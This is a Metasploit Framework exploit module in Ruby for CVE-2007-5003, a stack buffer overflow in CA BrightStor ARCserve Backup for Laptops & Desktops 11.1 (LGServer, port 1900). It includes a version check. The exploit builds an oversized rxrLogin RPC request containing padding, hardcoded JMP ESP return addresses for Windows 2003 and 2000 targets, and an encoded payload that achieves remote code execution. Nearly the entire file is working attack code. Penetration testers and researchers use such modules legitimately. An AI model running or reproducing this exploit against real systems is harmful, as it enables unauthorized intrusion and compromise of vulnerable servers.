##
# $Id: lgserver_rxrlogin.rb 10892 2010-11-03 22:09:44Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'CA BrightStor ARCserve for Laptops & Desktops LGServer Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Computer Associates BrightStor ARCserve Backup
				for Laptops & Desktops 11.1. By sending a specially crafted request, an attacker could
				overflow the buffer and execute arbitrary code.
			},
			'Author'         => [ 'MC' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 10892 $',
			'References'     =>
				[
					[ 'CVE', '2007-5003' ],
					[ 'OSVDB', '41353' ],
					[ 'BID', '24348' ],
				],
			'Privileged'     => true,
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'    => 550,
					'BadChars' => "\x00",
					'StackAdjustment' => -3500,
					'PrependEncoder' => "\x81\xc4\xff\xef\xff\xff\x44",
				},
			'Platform' => 'win',
			'Targets'  =>
					[
						[ 'Windows 2003 SP0 English',     { 'Ret' => 0x71ae1f9b } ], # JMP ESP wshtcpip.dll
						[ 'Windows 2000 SP4 English',     { 'Ret' => 0x7c30d043 } ], # JMP ESP advapi32.dll
					],
			'DisclosureDate' => 'Jun 6 2007',
			'DefaultTarget' => 0))

		register_options([ Opt::RPORT(1900) ], self.class)
	end

	def check
		connect

		sock.put("0000000019rxrGetServerVersion")
		ver = sock.get_once

		disconnect

		if ( ver =~ /11.1.742/ )
			return Exploit::CheckCode::Vulnerable
		end
		return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		buffer =  rand_text_alpha_upper(17420) + [target.ret].pack('V')
		buffer << payload.encoded + rand_text_alpha_upper(300)

		sploit  = "0000018124" # Command Length Field
		sploit << "rxrLogin"   # RPC Command
		sploit <<  "~~"        # Constant Argument Delimiter
		sploit <<  buffer      # Argument

		print_status("Trying target #{target.name}...")
		# One-shot overwrite...
		sock.put(sploit)

		handler
		disconnect
	end

end
